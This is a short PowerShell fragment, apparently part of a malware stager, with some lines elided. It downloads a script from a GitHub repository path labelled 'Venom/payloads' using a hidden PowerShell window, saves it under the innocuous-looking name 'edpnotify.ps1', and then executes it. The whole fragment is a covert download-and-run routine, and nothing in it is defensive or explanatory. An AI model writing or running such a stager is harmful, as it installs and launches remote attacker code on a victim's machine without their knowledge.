...
Set-Variable -Name extract -Value ("https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks3.ps1")
...
powershell -windowstyle hidden Invoke-WebRequest -Uri $extract -OutFile "$zipFilePath\edpnotify.ps1"
...
Start-Process -FilePath "$zipFilePath\edpnotify.ps1"
